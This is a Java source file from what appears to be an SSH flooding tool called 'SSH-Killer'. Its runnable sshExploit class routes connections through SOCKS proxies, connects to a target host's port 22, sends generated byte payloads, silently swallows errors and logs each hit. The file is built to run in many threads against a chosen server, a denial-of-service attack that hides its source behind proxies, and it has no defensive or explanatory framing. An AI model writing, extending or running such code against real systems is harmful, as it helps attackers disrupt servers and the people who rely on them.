package xyz.dxb1l.sshkiller.exploit;

import xyz.dxb1l.sshkiller.SSHKiller;
import xyz.dxb1l.sshkiller.proxy.ProxyManager;
import xyz.dxb1l.sshkiller.utils.ByteUtil;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;

public class sshExploit implements Runnable{


    public void exploit() {
        Proxy proxy = ProxyManager.getSocks();
        try {
            Socket s = ProxyManager.createSocket(proxy);
            if (s == null) {
                throw new ThreadDeath();
            }
            byte[] ez = ByteUtil.generate();
            s.connect(new InetSocketAddress(SSHKiller.ip, 22));
            s.getOutputStream().write(ez.length);
            s.getOutputStream().write(ez);
            System.out.println("[SSH-Killer] "+proxy+" -> "+SSHKiller.ip);
        } catch (Exception ignored) {
        }
    }

    @Override
    public void run() {
        exploit();
    }
}
